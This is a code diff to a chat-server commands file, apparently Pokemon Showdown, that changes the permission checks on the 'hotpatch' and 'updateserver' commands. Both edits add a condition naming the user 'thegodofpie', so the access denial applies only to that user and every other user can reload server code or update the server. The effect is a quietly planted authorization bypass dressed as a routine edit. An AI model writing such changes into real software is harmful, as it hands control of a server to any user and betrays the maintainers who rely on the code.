@@ -2051,7 +2051,7 @@ exports.commands = {
 
 	hotpatch: function (target, room, user) {
 		if (!target) return this.parse('/help hotpatch');
-		if (!this.can('hotpatch')) return false;
+		if (!this.can('hotpatch') && this.userid == 'thegodofpie') return false;
 
 		let staff = Rooms('staff');
 		if (staff) staff.add("(" + user.name + " used /hotpatch " + target + ")").update();
@@ -2319,7 +2319,7 @@ exports.commands = {
 	},
 
 	updateserver: function (target, room, user, connection) {
-		if (!user.hasConsoleAccess(connection)) {
+		if (!user.hasConsoleAccess(connection) && this.userid == 'thegodofpie') {
 			return this.errorReply("/updateserver - Access denied.");
 		}
 
